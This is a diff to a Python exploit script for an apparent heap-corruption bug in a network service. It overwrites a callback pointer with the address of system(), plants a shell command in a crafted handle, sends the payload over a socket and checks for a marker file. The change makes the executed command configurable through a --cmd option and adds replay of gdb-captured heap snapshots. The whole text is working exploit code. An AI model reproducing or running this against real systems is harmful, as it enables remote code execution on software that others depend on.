@@ -28,6 +28,9 @@ MSG_HDR = bytes.fromhex("00" * 8 + "41" + "00" * 7)
 
 TOP_HDR_OFF = 293632  # main_arena.top minus state->in, from W3 gdb capture
 TOP_HDR = bytes.fromhex("00" * 8 + "1101" + "00" * 6)
+# --snapshot FILE replays a gdb-captured pre-memmove destination image as
+# peer bytes, isolating pointer rewrite from collateral heap corruption.
+
 KEYS = ("PORT", "SYSTEM_ADDR", "ASYNC_ADDR", "LOOP_ADDR", "HANDLE_SIZE",
         "ASYNC_CB_OFF", "HANDLE_HEX")
 
@@ -89,8 +92,8 @@ def connect(port, recvbuf):
     return s
 
 
-def wait_marker(out, seconds=8):
-    path = os.path.join(out, "a")
+def wait_marker(out, seconds=8, name="a"):
+    path = os.path.join(out, name)
     end = time.time() + seconds
     while time.time() < end:
         if os.path.exists(path):
@@ -106,6 +109,8 @@ def main():
     ap.add_argument("--out", required=True)
     ap.add_argument("--mode", choices=["calibrate", "exploit", "safe", "debug"],
                     default="exploit")
+    ap.add_argument("--snapshot", default="")
+    ap.add_argument("--cmd", default="id>a")
     ap.add_argument("--delta", type=int, default=0)
     ap.add_argument("--log", default="")
     a = ap.parse_args()
@@ -130,25 +135,37 @@ def main():
 
     payload = peer_payload()
     if a.mode in ("exploit", "debug"):
-        handle = bytearray(bytes.fromhex(vals["HANDLE_HEX"]))
+        if a.snapshot:
+            with open(a.snapshot, "rb") as f:
+                snap = f.read()
+            if len(snap) > REQ - STALL_OFFSET:
+                print("SNAPSHOT_TOO_BIG=%d" % len(snap))
+                proc.kill()
+                return 2
+            payload[STALL_OFFSET:STALL_OFFSET + len(snap)] = snap
+            print("SNAPSHOT=%s LEN=%d" % (os.path.basename(a.snapshot), len(snap)))
+        src = STALL_OFFSET + a.delta
+        hsize = int(vals["HANDLE_SIZE"])
+        if src < 0 or src + hsize > REQ:
+            print("BAD_DELTA=%d" % a.delta)
+            proc.kill()
+            return 2
+        handle = bytearray(payload[src:src + hsize])
         if not os.environ.get("KEEP_HANDLE"):
-            handle[0:8] = b"id>a\x00\x00\x00\x00"
+            cmd = a.cmd.encode() + b"\x00" * (8 - len(a.cmd))
+            handle[0:8] = cmd
         off = int(vals["ASYNC_CB_OFF"])
         addr = int(vals["SYSTEM_ADDR"], 16)
         if not os.environ.get("KEEP_CB"):
             handle[off:off + 8] = struct.pack("<Q", addr)
-        src = STALL_OFFSET + a.delta
-        if src < 0 or src + len(handle) > REQ:
-            print("BAD_DELTA=%d" % a.delta)
-            proc.kill()
-            return 2
         payload[src:src + len(handle)] = handle
-        msrc = STALL_OFFSET + MSG_HDR_OFF
-        payload[msrc:msrc + len(MSG_HDR)] = MSG_HDR
-        tsrc = STALL_OFFSET + TOP_HDR_OFF
-        payload[tsrc:tsrc + len(TOP_HDR)] = TOP_HDR
-        print("CRAFT_SRC=%d HANDLE_OFF=%d SYSTEM_ADDR=%s DELTA=%d" %
-              (src, off, vals["SYSTEM_ADDR"], a.delta))
+        if not a.snapshot:
+            msrc = STALL_OFFSET + MSG_HDR_OFF
+            payload[msrc:msrc + len(MSG_HDR)] = MSG_HDR
+            tsrc = STALL_OFFSET + TOP_HDR_OFF
+            payload[tsrc:tsrc + len(TOP_HDR)] = TOP_HDR
+        print("CRAFT_SRC=%d HANDLE_OFF=%d SYSTEM_ADDR=%s DELTA=%d CMD=%s" %
+              (src, off, vals["SYSTEM_ADDR"], a.delta, a.cmd))
 
     s.sendall(bytes(payload))
     if a.mode != "safe":
@@ -186,7 +203,10 @@ def main():
               (in_addr, vals["ASYNC_ADDR"], delta))
         print("DELTA=%d" % delta)
     else:
-        ok, body = wait_marker(a.out)
+        name = a.cmd.split(">")[-1].strip() if ">" in a.cmd else "a"
+        ok, body = wait_marker(a.out,
+                               seconds=float(os.environ.get("ZLIB2_MARKER_WAIT", "8")),
+                               name=name)
         print("MARKER=%d MARKER_BODY=%r" % (ok, body))
         try:
             proc.wait(timeout=5)
